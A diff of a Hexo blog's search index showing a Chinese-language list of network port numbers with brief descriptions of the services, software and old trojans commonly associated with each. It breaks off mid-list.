-<p>446端口：DDM-远程关系数据库访问</p>
-<p>447端口：DDM-分布式文件管理</p>
-<p>448端口：DDM-使用安全访问远程数据库</p>
-<p>456端口：木马HACKERS PARADISE开放此端口</p>
-<p>458端口：apple quick time软件开放端口</p>
-<p>459端口：ampr-rcmd命令</p>
-<p>464端口：k密码服务</p>
-<p>469端口：广播控制协议</p>
-<p>470端口：scx-代理</p>
-<p>472端口：ljk-登陆</p>
-<p>481端口：Ph服务</p>
-<p>487端口：简单异步文件传输</p>
-<p>489端口：nest-协议</p>
-<p>491端口：go-登陆</p>
-<p>499端口：ISO ILL协议</p>
-<p>500端口：Internet密钥交换，Lsass开放端口，不能关闭</p>
-<p>509端口：陷阱</p>
-<p>510端口：FirstClass协议</p>
-<p>512端口：远程进程执行</p>
-<p>513端口：远程登陆</p>
-<p>514端口：cmd命令</p>
-<p>515端口：spooler</p>
-<p>516端口：可视化数据</p>
-<p>518端口：交谈</p>
-<p>519端口：unix时间</p>
-<p>520端口：扩展文件名称服务器</p>
-<p>525端口：时间服务</p>
-<p>526端口：新日期</p>
-<p>529端口：在线聊天系统服务</p>
-<p>530端口：远程过程调用</p>
-<p>531端口：聊天</p>
-<p>532端口：读新闻</p>
-<p>533端口：紧急广播端口</p>
-<p>534端口：MegaMedia管理端</p>
-<p>537端口：网络流媒体协议</p>
-<p>542端口：商业</p>
-<p>543端口：Kerberos(软件)v4&#x2F;v5</p>
-<p>544端口：krcmd命令</p>
-<p>546端口：DHCPv6 客户端</p>
-<p>547端口：DHCPv6 服务器</p>
-<p>552端口：设备共享</p>
-<p>554端口：Real Time Stream控制协议</p>
-<p>555端口：木马PhAse1.0、Stealth Spy、IniKiller开放此端口</p>
-<p>556端口：远距离文件服务器</p>
-<p>563端口：基于TLS&#x2F;SSL的网络新闻传输协议</p>
-<p>564端口：plan 9文件服务</p>
-<p>565端口：whoami查询</p>
-<p>566端口：streettalk</p>
-<p>567端口：banyan-rpc(远程过程调用)</p>
-<p>568端口：DPA成员资格</p>
-<p>569端口：MSN成员资格</p>
-<p>570端口：demon(调试监督程序)</p>
-<p>571端口：udemon(调试监督程序)</p>
-<p>572端口：声纳</p>
-<p>573端口：banyan-贵宾</p>
-<p>574端口：FTP软件代理系统</p>
-<p>581端口：Bundle Discovery 协议</p>
-<p>582端口：SCC安全</p>
-<p>583端口：Philips视频会议</p>
-<p>584端口：密钥服务器</p>
-<p>585端口：IMAP4+SSL (Use 993 instead)</p>
-<p>586端口：密码更改</p>
-<p>587端口：申请</p>
-<p>589端口：Eye连结</p>
-<p>595端口：CAB协议</p>
-<p>597端口：PTC名称服务</p>
-<p>598端口：SCO网络服务器管理3</p>
-<p>599端口：Aeolon Core协议</p>
-<p>600端口：Sun IPC(进程间通讯)服务器</p>
-<p>601端口：可靠系统登陆服务</p>
-<p>604端口：通道</p>
-<p>606端口：Cray统一资源管理</p>
-<p>608端口：发送人-传递&#x2F;提供 文件传输器</p>
-<p>609端口：npmp-陷阱</p>
-<p>610端口：npmp-本地</p>
-<p>611端口：npmp-gui( 图形用户界面)</p>
-<p>612端口：HMMP指引</p>
-<p>613端口：HMMP操作</p>
-<p>614端口：SSL(加密套接字协议层)shell(壳)</p>
-<p>615端口：Internet配置管理</p>
-<p>616端口：SCO(Unix系统)系统管理服务器</p>
-<p>617端口：SCO桌面管理服务器</p>
-<p>619端口：Compaq(康柏公司)EVM</p>
-<p>620端口：SCO服务器管理</p>
-<p>623端口：ASF远程管理控制协议</p>
-<p>624端口：Crypto管理</p>
-<p>631端口：IPP (Internet打印协议)</p>
-<p>633端口：服务更新(Sterling软件)</p>
-<p>637端口：局域网服务器</p>
-<p>641端口：repcmd命令</p>
-<p>647端口：DHCP(动态主机配置协议)Failover</p>
-<p>648端口：注册登记协议(RRP)</p>
-<p>649端口：Cadview-3d软件协议</p>
-<p>666端口：木马Attack FTP、Satanz Backdoor开放此端口</p>
-<p>808端口：ccproxy http&#x2F;gopher&#x2F;ftp (over http)协议</p>
-<p>1001端口：木马Silencer，WebEx开放端口</p>
-<p>1011端口：木马Doly开放端口</p>
-<p>1024端口：动态端口的开始,木马yai开放端口</p>
-<p>1025端口：inetinfo.exe(互联网信息服务)木马netspy开放端口</p>
-<p>1026端口：inetinfo.exe(互联网信息服务)</p>
-<p>1027端口：应用层网关服务</p>
-<p>1030端口：应用层网关服务</p>
-<p>1031端口：BBN IAD</p>
-<p>1033端口：本地网络信息端口</p>
-<p>1034端口：同步通知</p>
-<p>1036端口：安全部分传输协议</p>
-<p>1070端口：木马Psyber Stream，Streaming Audio开放端口</p>
-<p>1071端口：网络服务开放端口</p>
-<p>1074端口：网络服务开放端口</p>
-<p>1080端口：Socks这一协议以通道方式穿过防火墙，允许防火墙后面的人通过一个IP地址访问INTERNET</p>
-<p>1110端口：卡巴斯基反病毒软件开放此端口</p>
-<p>1125端口：卡巴斯基反病毒软件开放此端口</p>
-<p>1203端口：许可证生效端口</p>
-<p>1204端口：登陆请求监听端口</p>
-<p>1206端口：Anthony数据端口</p>
-<p>1222端口：SNI R&amp;D网络端口</p>
-<p>1233端口：普遍的附录服务器端口</p>
-<p>1234端口：木马SubSeven2.0、Ultors Trojan开放此端口</p>
-<p>1243端口：木马SubSeven1.0&#x2F;1.9开放此端口</p>
-<p>1245端口：木马Vodoo，GabanBus，NetBus，Vodoo开放此端口</p>
-<p>1273端口：EMC-网关端口</p>
-<p>1289端口：JWalk服务器端口</p>
-<p>1290端口：WinJa服务器端口</p>
-<p>1333端口：密码策略(网络服务)(svchost.exe)</p>
-<p>1334端口：网络服务(svchost.exe)</p>
-<p>1335端口：数字公正协议</p>
-<p>1336端口：即时聊天协议(svchost.exe)</p>
-<p>1349端口：注册网络协议端口</p>
-<p>1350端口：注册网络协议端口</p>
-<p>1371端口：富士通配置协议端口</p>
-<p>1372端口：富士通配置协议端口</p>
-<p>1374端口：EPI软件系统端口</p>
-<p>1376端口：IBM个人-个人软件端口</p>
-<p>1377端口：Cichlid许可证管理端口</p>
-<p>1378端口：Elan许可证管理端口</p>
-<p>1380端口：Telesis网络许可证管理端口</p>
-<p>1381端口：苹果网络许可证管理端口</p>
-<p>1386端口：CheckSum 许可证管理端口</p>
-<p>1387端口：系统开放端口(rundll32.exe)</p>
-<p>1388端口：数据库高速缓存端口</p>
-<p>1389端口：文档管理端口</p>
-<p>1390端口：存储控制器端口</p>
-<p>1391端口：存储器存取服务器端口</p>
-<p>1392端口：打印管理端口</p>
-<p>1393端口：网络登陆服务器端口</p>
-<p>1394端口：网络登陆客户端端口</p>
-<p>1395端口：PC工作站管理软件端口</p>
-<p>1396端口：DVL活跃邮件端口</p>
-<p>1397端口：音频活跃邮件端口</p>
-<p>1398端口：视频活跃邮件端口</p>
-<p>1399端口：Cadkey许可证管理端口</p>
-<p>1433端口：Microsoft的SQL服务开放端口</p>
-<p>1434端口：Microsoft的SQL服务监视端口</p>
-<p>1492端口：木马FTP99CMP开放此端口</p>
-<p>1509端口：木马Psyber Streaming Server开放此端口</p>
-<p>1512端口：Microsoft Windows网络名称服务</p>
-<p>1524端口：许多攻击脚本安装一个后门SHELL于这个端口</p>
-<p>1600端口：木马Shivka-Burka开放此端口</p>
-<p>1645端口：远程认证拨号用户服务</p>
-<p>1701端口：第2层隧道协议</p>
-<p>1731端口：NetMeeting音频调用控制</p>
-<p>1801端口：Microsoft消息队列服务器</p>
-<p>1807端口：木马SpySender开放此端口</p>
-<p>1900端口：可被利用ddos攻击，一般关闭</p>
-<p>1912端口：金山词霸开放此端口</p>
-<p>1981端口：木马ShockRave开放此端口</p>
-<p>1999端口：木马BackDoor,yai开放此端口</p>
-<p>2000端口：木马GirlFriend 1.3、Millenium 1.0开放此端口</p>
-<p>2001端口：木马Millenium 1.0、Trojan Cow,黑洞2001开放此端口</p>
-<p>2003端口：GNU 查询</p>
-<p>2023端口：木马Pass Ripper开放此端口</p>
-<p>2049端口：NFS程序常运行于此端口</p>
-<p>2115端口：木马Bugs开放此端口</p>
-<p>2140端口：木马Deep Throat 1.0&#x2F;3.0，The Invasor开放此端口</p>
-<p>2500端口：应用固定端口会话复制的RPC客户</p>
-<p>2504端口：网络平衡负荷</p>
-<p>2565端口：木马Striker开放此端口</p>
-<p>2583端口：木马Wincrash 2.0开放此端口</p>
-<p>2801端口：木马Phineas Phucker开放此端口</p>
-<p>2847端口：诺顿反病毒服务开放此端口</p>
-<p>3024端口：木马WinCrash开放此端口</p>
-<p>3128端口：squid http代理服务器开放此端口</p>
-<p>3129端口：木马Master Paradise开放此端口</p>
-<p>3150端口：木马The Invasor,deep throat开放此端口</p>
-<p>3210端口：木马SchoolBus开放此端口</p>
-<p>3306端口：MySQL开放此端口</p>
-<p>3333端口：木马Prosiak开放此端口</p>
-<p>3389端口：WINDOWS 2000终端开放此端口</p>
-<p>3456端口：inetinfo.exe(互联网信息服务)开放端口，VAT默认数据</p>
-<p>3457端口：VAT默认控制</p>
-<p>3527端口：Microsoft消息队列服务器</p>
-<p>3700端口：木马Portal of Doom开放此端口</p>
-<p>3996端口：木马RemoteAnything开放此端口</p>
-<p>4000端口：腾讯QQ客户端开放此端口</p>
-<p>4060端口：木马RemoteAnything开放此端口</p>
-<p>4092端口：木马WinCrash开放此端口</p>
-<p>4133端口：NUTS Bootp服务器</p>
-<p>4134端口：NIFTY-Serve HMI协议</p>
-<p>4141端口：Workflow服务器</p>
-<p>4142端口：文档服务器</p>
-<p>4143端口：文档复制</p>
-<p>4145端口：VVR控制</p>
-<p>4321端口：远程Who Is查询</p>
-<p>4333端口：微型sql服务器</p>
-<p>4349端口：文件系统端口记录</p>
-<p>4350端口：网络设备</p>
-<p>4351端口：PLCY网络服务</p>
-<p>4453端口：NSS警报管理</p>
-<p>4454端口：NSS代理管理</p>
-<p>4455端口：PR聊天用户</p>
-<p>4456端口：PR聊天服务器</p>
-<p>4457端口：PR注册</p>
-<p>4480端口：Proxy+ HTTP代理端口</p>
-<p>4500端口：Lsass开放端口，不能关闭</p>
-<p>4547端口：Lanner许可管理</p>
-<p>4555端口：RSIP端口</p>
-<p>4590端口：木马ICQTrojan开放此端口</p>
-<p>4672端口：远程文件访问服务器</p>
-<p>4752端口：简单网络音频服务器</p>
-<p>4800端口：Icona快速消息系统</p>
-<p>4801端口：Icona网络聊天</p>
-<p>4802端口：Icona许可系统服务器</p>
-<p>4848端口：App服务器-Admin HTTP</p>
-<p>4849端口：App服务器-Admin HTTPS</p>
-<p>4950端口：木马IcqTrojan开放5000端口</p>
-<p>5000端口：木马blazer5，Sockets de Troie开放5000端口，一般应关闭</p>
-<p>5001端口：木马Sockets de Troie开放5001端口</p>
-<p>5006端口：wsm服务器</p>
-<p>5007端口：wsm服务器ssl</p>
-<p>5022端口：mice服务器</p>
-<p>5050端口：多媒体会议控制协议</p>
-<p>5051端口：ITA代理</p>
-<p>5052端口：ITA管理</p>
-<p>5137端口：MyCTS服务器端口</p>
-<p>5150端口：Ascend通道管理协议</p>
-<p>5154端口：BZFlag游戏服务器</p>
-<p>5190端口：America-Online(美国在线)</p>
-<p>5191端口：AmericaOnline1(美国在线)</p>
-<p>5192端口：AmericaOnline2(美国在线)</p>
-<p>5193端口：AmericaOnline3(美国在线)</p>
-<p>5222端口：Jabber客户端连接</p>
-<p>5225端口：HP(惠普公司)服务器</p>
-<p>5226端口：HP(惠普公司)</p>
-<p>5232端口：SGI绘图软件端口</p>
-<p>5250端口：i网关</p>
-<p>5264端口：3Com网络端口1</p>
-<p>5265端口：3Com网络端口2</p>
-<p>5269端口：Jabber服务器连接</p>
-<p>5306端口：Sun MC组</p>
-<p>5321端口：木马Sockets de Troie开放5321端口</p>
-<p>5400端口：木马Blade Runner开放此端口</p>
-<p>5401端口：木马Blade Runner开放此端口</p>
-<p>5402端口：木马Blade Runner开放此端口</p>
-<p>5405端口：网络支持</p>
-<p>5409端口：Salient数据服务器</p>
-<p>5410端口：Salient用户管理</p>
-<p>5415端口：NS服务器</p>
-<p>5416端口：SNS网关</p>
-<p>5417端口：SNS代理</p>
-<p>5421端口：网络支持2</p>
-<p>5423端口：虚拟用户</p>
-<p>5427端口：SCO-PEER-TTA(Unix系统)</p>
-<p>5432端口：PostgreSQL数据库</p>
-<p>5550端口：木马xtcp开放此端口</p>
-<p>5569端口：木马Robo-Hack开放此端口</p>
-<p>5599端口：公司远程安全安装</p>
-<p>5600端口：公司安全管理</p>
-<p>5601端口：公司安全代理</p>
-<p>5631端口：pcANYWHERE(软件)数据</p>
-<p>5632端口：pcANYWHERE(软件)数据</p>
-<p>5673端口：JACL消息服务器</p>
-<p>5675端口：V5UA应用端口</p>
-<p>5676端口：RA管理</p>
-<p>5678端口：远程复制代理连接</p>
-<p>5679端口：直接电缆连接</p>
-<p>5720端口：MS-执照</p>
-<p>5729端口：Openmail用户代理层</p>
-<p>5730端口：Steltor’s日历访问</p>
-<p>5731端口：netscape(网景)suiteware</p>
-<p>5732端口：netscape(网景)suiteware</p>
-<p>5742端口：木马WinCrash1.03开放此端口</p>
-<p>5745端口：fcopy-服务器</p>
-<p>5746端口：fcopys-服务器</p>
-<p>5755端口：OpenMail(邮件服务器)桌面网关服务器</p>
-<p>5757端口：OpenMail(邮件服务器)X.500目录服务器</p>
-<p>5766端口：OpenMail (邮件服务器)NewMail服务器</p>
-<p>5767端口：OpenMail (邮件服务器)请求代理曾(安全)</p>
-<p>5768端口：OpenMail(邮件服务器) CMTS服务器</p>
-<p>5777端口：DALI端口</p>
-<p>5800端口：虚拟网络计算</p>
-<p>5801端口：虚拟网络计算</p>
-<p>5802端口：虚拟网络计算HTTP访问, d</p>
-<p>5803端口：虚拟网络计算HTTP访问, d</p>
-<p>5900端口：虚拟网络计算机显示0</p>
-<p>5901端口：虚拟网络计算机显示1</p>
-<p>5902端口：虚拟网络计算机显示2</p>
-<p>5903端口：虚拟网络计算机显示3</p>
-<p>6000端口：X Window 系统</p>
-<p>6001端口：X Window 服务器</p>
-<p>6002端口：X Window 服务器</p>
-<p>6003端口：X Window 服务器</p>
-<p>6004端口：X Window 服务器</p>
-<p>6005端口：X Window 服务器</p>
-<p>6006端口：X Window 服务器</p>
-<p>6007端口：X Window 服务器</p>
-<p>6008端口：X Window 服务器</p>
-<p>6009端口：X Window 服务器</p>
-<p>6456端口：SKIP证书发送</p>
-<p>6471端口：LVision许可管理器</p>
-<p>6505端口：BoKS管理私人端口</p>
-<p>6506端口：BoKS管理公共端口</p>
-<p>6507端口：BoKS Dir服务器,私人端口</p>
-<p>6508端口：BoKS Dir服务器,公共端口</p>
-<p>6509端口：MGCS-MFP端口</p>
-<p>6510端口：MCER端口</p>
-<p>6566端口：SANE控制端口</p>
-<p>6580端口：Parsec主服务器</p>
-<p>6581端口：Parsec对等网络</p>
-<p>6582端口：Parsec游戏服务器</p>
-<p>6588端口：AnalogX HTTP代理端口</p>
-<p>6631端口：Mitchell电信主机</p>
-<p>6667端口：Internet多线交谈</p>
-<p>6668端口：Internet多线交谈</p>
-<p>6670端口：木马Deep Throat开放此端口</p>
-<p>6671端口：木马Deep Throat 3.0开放此端口</p>
-<p>6699端口：Napster文件(MP3)共享服务</p>
-<p>6701端口：KTI&#x2F;ICAD名称服务器</p>
-<p>6788端口：SMC软件-HTTP</p>
-<p>6789端口：SMC软件-HTTPS</p>
-<p>6841端口：Netmo软件默认开放端口</p>
-<p>6842端口：Netmo HTTP服务</p>
-<p>6883端口：木马DeltaSource开放此端口</p>
-<p>6939端口：木马Indoctrination开放此端口</p>
-<p>6969端口：木马Gatecrasher、Priority开放此端口</p>
-<p>6970端口：real音频开放此端口</p>
-<p>7000端口：木马Remote Grab开放此端口</p>
-<p>7002端口：使用者&amp; 组 数据库</p>
-<p>7003端口：音量定位数据库</p>
-<p>7004端口：AFS&#x2F;Kerberos认证服务</p>
-<p>7005端口：音量管理服务</p>
-<p>7006端口：错误解释服务</p>
-<p>7007端口：Basic监督进程</p>
-<p>7008端口：服务器-服务器更新程序</p>
-<p>7009端口：远程缓存管理服务</p>
-<p>7011端口：Talon软件发现端口</p>
-<p>7012端口：Talon软件引擎</p>
-<p>7013端口：Microtalon发现</p>
-<p>7014端口：Microtalon通信</p>
-<p>7015端口：Talon网络服务器</p>
-<p>7020端口：DP服务</p>
-<p>7021端口：DP服务管理</p>
-<p>7100端口：X字型服务</p>
-<p>7121端口：虚拟原型许可证管理</p>
-<p>7300端口：木马NetMonitor开放此端口</p>
-<p>7301端口：木马NetMonitor开放此端口</p>
-<p>7306端口：木马NetMonitor，NetSpy1.0开放此端口</p>
-<p>7307端口：木马NetMonitor开放此端口</p>
-<p>7308端口：木马NetMonitor开放此端口</p>
-<p>7323端口：Sygate服务器端</p>
-<p>7511端口：木马聪明基因开放此端口</p>
-<p>7588端口：Sun许可证管理</p>
-<p>7597端口：木马Quaz开放此端口</p>
-<p>7626端口：木马冰河开放此端口</p>
-<p>7633端口：PMDF管理</p>
-<p>7674端口：iMQ SSL通道</p>
-<p>7675端口：iMQ通道</p>
-<p>7676端口：木马Giscier开放此端口</p>
-<p>7720端口：Med图象入口</p>
-<p>7743端口：Sakura脚本传递协议</p>
-<p>7789端口：木马ICKiller开放此端口</p>
-<p>7797端口：Propel连接器端口</p>
-<p>7798端口：Propel编码器端口</p>
-<p>8000端口：腾讯QQ服务器端开放此端口</p>
-<p>8001端口：VCOM通道</p>
-<p>8007端口：Apache(类似iis)jServ协议1.x</p>
-<p>8008端口：HTTP Alternate</p>
-<p>8009端口：Apache(类似iis)JServ协议1.3</p>
-<p>8010端口：Wingate代理开放此端口</p>
-<p>8011端口：木马way2.4开放此端口</p>
-<p>8022端口：OA-系统</p>
-<p>8080端口：WWW代理开放此端口</p>
-<p>8081端口：ICECap控制台</p>
-<p>8082端口：BlackIce(防止黑客软件)警报发送到此端口</p>
-<p>8118端口：Privoxy HTTP代理</p>
-<p>8121端口：Apollo数据端口</p>
-<p>8122端口：Apollo软件管理端口</p>
-<p>8181端口：Imail</p>
-<p>8225端口：木马灰鸽子开放此端口</p>
-<p>8311端口：木马初恋情人开放此端口</p>
-<p>8351端口：服务器寻找</p>
-<p>8416端口：eSpeech Session协议</p>
-<p>8417端口：eSpeech RTP协议</p>
-<p>8473端口：虚拟点对点</p>
-<p>8668端口：网络地址转换</p>
-<p>8786端口：Message客户端</p>
-<p>8787端口：Message服务器</p>
-<p>8954端口：Cumulus管理端口</p>
-<p>9000端口：CS监听</p>
-<p>9001端口：ETL服务管理</p>
-<p>9002端口：动态id验证</p>
-<p>9021端口：Pangolin验证</p>
-<p>9022端口：PrivateArk远程代理</p>
-<p>9023端口：安全网络登陆-1</p>
-<p>9024端口：安全网络登陆-2</p>
-<p>9025端口：安全网络登陆-3</p>
-<p>9026端口：安全网络登陆-4</p>
-<p>9101端口：Bacula控制器</p>
-<p>9102端口：Bacula文件后台</p>
-<p>9103端口：Bacula存储邮件后台</p>
-<p>9111端口：DragonIDS控制台</p>
-<p>9217端口：FSC通讯端口</p>
-<p>9281端口：软件传送端口1</p>
-<p>9282端口：软件传送端口2</p>
-<p>9346端口：C技术监听</p>
-<p>9400端口：木马Incommand 1.0开放此端口</p>
-<p>9401端口：木马Incommand 1.0开放此端口</p>
-<p>9402端口：木马Incommand 1.0开放此端口</p>
-<p>9594端口：信息系统</p>
-<p>9595端口：Ping Discovery服务</p>
-<p>9800端口：WebDav源端口</p>
-<p>9801端口：Sakura脚本转移协议-2</p>
-<p>9802端口：WebDAV Source TLS&#x2F;SSL</p>
-<p>9872端口：木马Portal of Doom开放此端口</p>
-<p>9873端口：木马Portal of Doom开放此端口</p>
-<p>9874端口：木马Portal of Doom开放此端口</p>
-<p>9875端口：木马Portal of Doom开放此端口</p>
-<p>9899端口：木马InIkiller开放此端口</p>
-<p>9909端口：域名时间</p>
-<p>9911端口：SYPECom传送协议</p>
-<p>9989端口：木马iNi-Killer开放此端口</p>
-<p>9990端口：OSM Applet程序服务器</p>
-<p>9991端口：OSM事件服务器</p>
-<p>10000端口：网络数据管理协议</p>
-<p>10001端口：SCP构造端口</p>
-<p>10005端口：安全远程登陆</p>
-<p>10008端口：Octopus多路器</p>
-<p>10067端口：木马iNi-Killer开放此端口</p>
-<p>10113端口：NetIQ端点</p>
-<p>10115端口：NetIQ端点</p>
-<p>10116端口：NetIQVoIP鉴定器</p>
-<p>10167端口：木马iNi-Killer开放此端口</p>
-<p>11000端口：木马SennaSpy开放此端口</p>
-<p>11113端口：金山词霸开放此端口</p>
-<p>11233端口：木马Progenic trojan开放此端口</p>
-<p>12076端口：木马Telecommando开放此端口</p>
-<p>12223端口：木马Hack’99 KeyLogger开放此端口</p>
-<p>12345端口：木马NetBus1.60&#x2F;1.70、GabanBus开放此端口</p>
-<p>12346端口：木马NetBus1.60&#x2F;1.70、GabanBus开放此端口</p>
-<p>12361端口：木马Whack-a-mole开放此端口</p>
-<p>13223端口：PowWow 客户端，是Tribal Voice的聊天程序</p>
-<p>13224端口：PowWow 服务器，是Tribal Voice的聊天程序</p>
-<p>16959端口：木马Subseven开放此端口</p>
-<p>16969端口：木马Priority开放此端口</p>
-<p>17027端口：外向连接</p>
-<p>19191端口：木马蓝色火焰开放此端口</p>
-<p>20000端口：木马Millennium开放此端口</p>
-<p>20001端口：木马Millennium开放此端口</p>
-<p>20034端口：木马NetBus Pro开放此端口</p>
-<p>21554端口：木马GirlFriend开放此端口</p>
-<p>22222端口：木马Prosiak开放此端口</p>
-<p>23444端口：木马网络公牛开放此端口</p>
-<p>23456端口：木马Evil FTP、Ugly FTP开放此端口</p>
-<p>25793端口：Vocaltec地址服务器</p>
-<p>26262端口：K3软件-服务器</p>
-<p>26263端口：K3软件客户端</p>
-<p>26274端口：木马Delta开放此端口</p>
-<p>27374端口：木马Subseven 2.1开放此端口</p>
-<p>30100端口：木马NetSphere开放此端口</p>
-<p>30129端口：木马Masters Paradise开放此端口</p>
-<p>30303端口：木马Socket23开放此端口</p>
-<p>30999端口：木马Kuang开放此端口</p>
-<p>31337端口：木马BO(Back Orifice)开放此端口</p>
-<p>31338端口：木马BO(Back Orifice)，DeepBO开放此端口</p>
-<p>31339端口：木马NetSpy DK开放此端口</p>
-<p>31666端口：木马BOWhack开放此端口</p>
-<p>31789端口：Hack-a-tack</p>
-<p>32770端口：sun solaris RPC服务开放此端口</p>
-<p>33333端口：木马Prosiak开放此端口</p>
-<p>33434端口：路由跟踪</p>
-<p>34324端口：木马Tiny Telnet Server、BigGluck、TN开放此端口</p>
-<p>36865端口：KastenX软件端口</p>
-<p>38201端口：Galaxy7软件数据通道</p>
-<p>39681端口：TurboNote默认端口</p>
-<p>40412端口：木马The Spy开放此端口</p>
-<p>40421端口：木马Masters Paradise开放此端口</p>
-<p>40422端口：木马Masters Paradise开放此端口</p>
-<p>40423端口：木马Masters Paradise开放此端口</p>
-<p>40426端口：木马Masters Paradise开放此端口</p>
-<p>40843端口：CSCC 防火墙</p>
-<p>43210端口：木马SchoolBus 1.0&#x2F;2.0开放此端口</p>
-<p>43190端口：IP-PROVISION</p>
-<p>44321端口：PCP服务器(pmcd)</p>
-<p>44322端口：PCP服务器(pmcd)代理</p>
-<p>44334端口：微型个人防火墙端口</p>
-<p>44442端口：ColdFusion软件端口</p>
-<p>44443端口：ColdFusion软件端口</p>
-<p>44445端口：木马Happypig开放此端口</p>
-<p>45576端口：E代时光专业代理开放此端口</p>
-<p>47262端口：木马Delta开放此端口</p>
-<p>47624端口：Direct Play服务器</p>
-<p>47806端口：ALC协议</p>
-<p>48003端口：Nimbus网关</p>
-<p>50505端口：木马Sockets de Troie开放此端口</p>
-<p>50766端口：木马Fore开放此端口</p>
-<p>53001端口：木马Remote Windows Shutdown开放此端口</p>
-<p>54320端口：木马bo2000开放此端口</p>
-<p>54321端口：木马SchoolBus 1.0&#x2F;2.0开放此端口</p>
-<p>61466端口：木马Telecommando开放此端口</p>
-<p>65000端口：木马Devil 1.03开放此端口</p>
-<p>65301端口：PC Anywhere软件开放端口</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>各网络端口介绍</title>
+      <link href="/2023/07/22/%E5%90%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D/"/>
+      <url>/2023/07/22/%E5%90%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>网络端口，TCP&#x2F;IP协议 中的端口， 端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等</p><span id="more"></span><p>2端口：管理实用程序</p><p>3端口：压缩进程</p><p>5端口：远程作业登录</p><p>7端口：回显</p><p>9端口：丢弃</p><p>11端口：在线用户</p><p>13端口：时间</p><p>17端口：每日引用</p><p>18端口：消息发送协议</p><p>19端口：字符发生器</p><p>20端口：FTP文件传输协议(默认数据口)</p><p>21端口：FTP文件传输协议(控制)</p><p>22端口：SSH远程登录协议</p><p>23端口：telnet(终端仿真协议),木马Tiny Telnet Server开放此端口</p><p>24端口：预留给个人用邮件系统</p><p>25端口：SMTP服务器所开放的端口，用于发送邮件</p><p>27端口：NSW 用户系统 FE</p><p>29端口：MSG ICP</p><p>31端口：MSG验证,木马Master Paradise、HackersParadise开放此端口</p><p>33端口：显示支持协议</p><p>35端口：预留给个人打印机服务</p><p>37端口：时间</p><p>38端口：路由访问协议</p><p>39端口：资源定位协议</p><p>41端口：图形</p><p>42端口：主机名服务</p><p>43端口：who is服务</p><p>44端口：MPM(消息处理模块)标志协议</p><p>45端口：消息处理模块</p><p>46端口：消息处理模块(默认发送口)</p><p>47端口：NI FTP</p><p>48端口：数码音频后台服务</p><p>49端口：TACACS登录主机协议</p><p>50端口：远程邮件检查协议</p><p>51端口：IMP(接口信息处理机)逻辑地址维护</p><p>52端口：施乐网络服务系统时间协议</p><p>53端口：dns域名服务器</p><p>54端口：施乐网络服务系统票据交换</p><p>55端口：ISI图形语言</p><p>56端口：施乐网络服务系统验证</p><p>57端口：预留个人用终端访问</p><p>58端口：施乐网络服务系统邮件</p><p>59端口：预留个人文件服务</p><p>60端口：未定义</p><p>61端口：NI邮件</p><p>62端口：异步通讯适配器服务</p><p>63端口：whois++</p><p>64端口：通讯接口</p><p>65端口：TACACS数据库服务</p><p>66端口：Oracle SQL*NET</p><p>67端口：引导程序协议服务端</p><p>68端口：引导程序协议客户端</p><p>69端口：小型文件传输协议</p><p>70端口：信息检索协议</p><p>71端口：远程作业服务</p><p>72端口：远程作业服务</p><p>73端口：远程作业服务</p><p>74端口：远程作业服务</p><p>75端口：预留给个人拨出服务</p><p>76端口：分布式外部对象存储</p><p>77端口：预留给个人远程作业输入服务</p><p>78端口：修正TCP</p><p>79端口：查询远程主机在线用户等信息</p><p>80端口：http,用于网页浏览,木马Executor开放此端口</p><p>81端口：HOST2名称服务</p><p>82端口：传输实用程序</p><p>83端口：模块化智能终端ML设备</p><p>84端口：公用追踪设备</p><p>85端口：模块化智能终端ML设备</p><p>86端口：Micro Focus Cobol编程语言</p><p>87端口：预留给个人终端连接</p><p>88端口：Kerberros安全认证系统</p><p>89端口：SU&#x2F;MIT telnet(终端仿真网关)</p><p>90端口：DNSIX 安全属性标记图</p><p>91端口：MIT Dover假脱机</p><p>92端口：网络打印协议</p><p>93端口：设备控制协议</p><p>94端口：Tivoli对象调度</p><p>96端口：DIXIE协议规范</p><p>97端口：快速远程虚拟文件协议</p><p>98端口：TAC新闻协议</p><p>99端口：后门程序ncx99开放此端口</p><p>100端口：未知用途</p><p>101端口：NIC 主机名称服务</p><p>102端口：消息传输代理</p><p>103端口：Genesis 点对点传输网络</p><p>105端口：信箱名称服务</p><p>106端口：3COM-TSMUX开放端口</p><p>107端口：远程Telnet服务</p><p>108端口：SNA 网关访问服务</p><p>109端口：POP2服务器开放此端口,用于接收邮件</p><p>110端口：POP3服务器开放此端口,用于接收邮件</p><p>111端口：SUN公司的RPC服务所有端口</p><p>112端口：McIDAS 数据传输协议</p><p>113端口：认证服务，用于鉴别TCP连接的用户</p><p>114端口：音频新闻多点服务</p><p>115端口：简单文件传输服务</p><p>116端口：ANSA REX 通知</p><p>117端口：UUCP 路径服务</p><p>118端口：SQL 服务</p><p>119端口：NEWS新闻组传输协议，承载USENET通信</p><p>121端口：木马BO jammerkillahV开放端口</p><p>122端口：SMAKY网络</p><p>123端口：网络时间协议，蠕虫病毒会利用，一般关闭</p><p>128端口：GSS X许可认证</p><p>129端口：密码生成器协议</p><p>130端口：Cisco软件开放端口</p><p>131端口：Cisco软件开放端口</p><p>132端口：Cisco软件开放端口</p><p>133端口：统计服务</p><p>134端口：INGRES-网络服务</p><p>135端口：DCOM服务，冲击波病毒利用，不能关闭</p><p>136端口：命名系统</p><p>137端口：NETBIOS协议应用，为共享开放</p><p>138端口：NETBIOS协议应用，为共享开放</p><p>139端口：NETBIOS协议应用，为共享开放</p><p>140端口：EMFIS数据服务</p><p>141端口：EMFIS控制服务</p><p>143端口：Interim邮件访问协议</p><p>144端口：UMA软件开放端口</p><p>145端口：UAAC协议</p><p>149端口：AED 512仿真服务</p><p>150端口：SQL(结构化查询语言)-网络</p><p>152端口：后台文件传输协议</p><p>156端口：SQL(结构化查询语言)服务</p><p>158端口：PC邮件服务器</p><p>159端口：NSS-路由</p><p>160端口：SGMP-陷阱</p><p>161端口：简单网络管理协议</p><p>162端口：SNMP陷阱</p><p>163端口：CMIP&#x2F;TCP 